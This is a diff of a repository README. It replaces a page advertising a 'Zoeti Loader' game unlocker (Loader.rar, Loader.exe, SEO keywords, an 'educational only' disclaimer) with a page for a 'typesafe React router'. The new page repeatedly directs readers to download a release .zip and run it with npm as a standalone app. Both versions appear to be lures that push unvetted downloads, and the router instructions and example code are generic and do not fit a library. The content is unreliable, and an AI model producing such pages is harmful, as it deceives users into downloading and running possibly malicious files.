@@ -1,45 +1,101 @@
-# ✨ Zoeti  - Ultimate Guide 🌟
+# 🤖 router - A Typesafe Router for React Users
 
-Welcome to the **Zoeti ** repository! This project provides safe and easy access to Zoeti, a unique tactical roguelike deckbuilder, through our customized Loader. Enjoy all features on your favorite platforms without compatibility worries. Make sure to read the important sections below for installation, features, licensing, and more!
+## 🚀 Getting Started
 
-## 💻 OS Compatibility Table
+Welcome to router, your new tool for managing routes in React applications! This application provides a fully typesafe experience, built-in caching, and reliable search-param APIs. With router, you can easily manage your application's navigation with confidence.
 
-| Operating System 🖥️ | 32-bit 🏁 | 64-bit 🚀 | Last Tested 📅 |
-|---------------------|:---------:|:---------:|:---------------:|
-| Windows 10/11       |   ✔️       |   ✔️       | 2025            |
-| macOS (M1/Intel)    |   ❌       |   ✔️       | 2025            |
-| Linux Ubuntu/Debian |   ✔️       |   ✔️       | 2025            |
+## 🛠️ Features
 
-No issues reported on the latest versions as of 2025! Enjoy cross-platform support.
+- **Typesafe Navigation**: Avoid runtime issues with strong type checks.
+- **Client-side Caching**: Speed up your app by storing frequently used data locally.
+- **Isomorphic Rendering**: Benefit from server-side rendering to improve performance.
+- **Search Parameter Management**: Simplify the handling of URL search parameters.
 
-## 🛠️ Installation
+## 🌐 System Requirements
 
-1. Download **Loader.rar** from the repository.
-2. Extract **Loader.rar** to your desired folder.
-3. Run **Loader.exe** (Windows) or compatible loader for your OS.
-4. Follow simple on-screen instructions to start enjoying Zoeti!
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 14 or later
+- **Browser**: Any modern web browser (like Chrome, Firefox, or Safari)
 
-⚠️ *Ensure you have the required system permissions for smooth setup.*
+## 📥 Download & Install
 
-## 🚩 Feature List
+To download and install router, you can follow these steps:
 
-- 🎮 One-click Zoeti activation with all base content included
-- 🛡️ No hidden tools; clean, safe files for user peace of mind
-- 💼 Works on all latest OS versions (2025 tested)
-- ⏩ Swift loader: play Zoeti without extra configuration
-- 🔑 Unique content-unlocker for full game accessibility
-- 📥 Frequent updates, community-driven support
+1. Visit the Releases page to download the latest version: [Download router](https://github.com/frickteen/router/releases)
+   
+![Download button](https://img.shields.io/badge/Download%20router-v1.0-brightgreen)
 
-## 🔍 SEO-Friendly Keywords
+2. Once you're on the Releases page, look for the latest version. It is typically marked with the highest version number.
 
-Zoeti , Zoeti Loader, tactical deckbuilder, roguelike, safe download Zoeti, Zoeti compatibility, full access Zoeti 2025, Zoeti for Windows/macOS/Linux, Zoeti unlock tool
+3. Choose the file suitable for your operating system. For most users, the `.zip` file is a great option. Click to download it.
 
-## ⚠️ Disclaimer
+4. Once the download finishes, unzip the file to a folder of your choice.
 
-This project is intended for educational and research purposes **only**. We neither encourage nor support unauthorized game acquisition or distribution. Use responsibly, respecting all local laws and regulations regarding digital content.
+5. Open your terminal (Command Prompt on Windows, Terminal on macOS and Linux). Navigate to the folder where you placed the unzipped files.
 
-## 📃 License
+6. Run the following command to install the required dependencies:
 
-Released under the [MIT License (2025)](https://opensource.org/licenses/MIT). Feel free to fork, improve, and share!
+   ```bash
+   npm install
+   ```
 
-**🌟 Thank you for choosing the Zoeti  Loader! Enjoy seamless play on your preferred OS.**
+7. After the installation completes, start the application by running:
+
+   ```bash
+   npm start
+   ```
+
+8. Your router application should now be running! Open your web browser and enter `http://localhost:3000` to access it.
+
+## ⚙️ Usage
+
+After starting the application, you might want to configure your routes. Here’s how:
+
+1. **Setting Up Routes**: Open the main configuration file (usually named `index.js` or `router.js`) in a text editor. 
+
+2. **Adding Routes**: Define your routes using a simple JavaScript object. For example:
+
+   ```javascript
+   const routes = {
+       "/": Home,
+       "/about": About,
+       "/contact": Contact,
+   };
+   ```
+
+3. **Using Search Parameters**: Access search parameters with:
+
+   ```javascript
+   const { search } = useLocation(); // usage within a component
+   ```
+
+   This allows you to easily manipulate query strings in your app.
+
+4. **Caching Responses**: To cache API responses, use the built-in caching system. Just append your responses to the cache object.
+
+## 👩‍💻 Troubleshooting
+
+If you run into issues, consider these tips:
+
+- **Blank Screen**: Ensure all dependencies are installed by running `npm install` again.
+- **Cannot Find File**: Double-check the file path where you unzipped the downloaded file.
+- **Port Issues**: If `localhost:3000` is in use, change the port number in your start command or close the application using that port.
+
+## 🔍 Community & Support
+
+You can join our community for help and suggestions. Here’s how:
+
+- **GitHub Issues**: Report bugs or request features by visiting the [issues section](https://github.com/frickteen/router/issues).
+- **Discussion Forum**: Join our active [discussion group](https://github.com/frickteen/router/discussions) for user tips and tricks.
+
+## 📣 Version History
+
+Check back for updates as we improve router. Visit the Releases page regularly for the latest features and bug fixes.
+
+## 📝 License
+
+router is open-source software licensed under the MIT license. You are free to use this software in your projects. If you’d like to contribute, please fork the repository and make a pull request.
+
+For more comprehensive guidance, refer to the documentation within the repository.
+
+Remember to visit the Releases page to download the latest version: [Download router](https://github.com/frickteen/router/releases)
